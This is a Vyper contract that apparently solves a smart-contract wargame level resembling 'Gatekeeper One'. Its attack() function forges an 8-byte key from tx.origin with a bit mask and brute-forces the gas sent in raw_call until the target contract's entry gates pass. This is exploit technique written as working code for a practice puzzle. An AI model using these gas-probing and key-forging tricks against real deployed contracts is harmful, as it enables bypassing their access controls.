# @version ^0.3.7

interface InstanceInterface:
    def entrant() -> address: view

owner: immutable(address)

instance: InstanceInterface

event Print:
    gas_left: indexed(uint256)
    key: indexed(bytes8)

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance

@external
@view
def instanceEntrant() -> address:
    return self.instance.entrant()

@external
def attack():
    assert msg.sender == owner, "!owner"
    key: bytes8 = self._setKey()
    success: bool = False
    response: Bytes[32] = b""
    for i in range(max_value(uint8)):
        success, response = raw_call(
            self.instance.address,
            concat(
                method_id("enter(bytes8)"),
                convert(key, bytes32)
            ),
            max_outsize=32,
            revert_on_failure=False,
            gas=(i + 150 + 8191 * 3),
        )
        if success:
            assert self.instance.entrant() == owner, "!passed"
            log Print(i + 150 + 8191 * 3, key)
            break

@internal
def _setKey() -> bytes8:
    mask: uint256 = convert(0xFFFFFFFF0000FFFF, uint256)
    key_32: bytes32 = convert(
        convert(tx.origin, uint256) & mask,
        bytes32
    )
    key: bytes8 = convert(
        slice(key_32, 24, 8),
        bytes8
    )
    return key
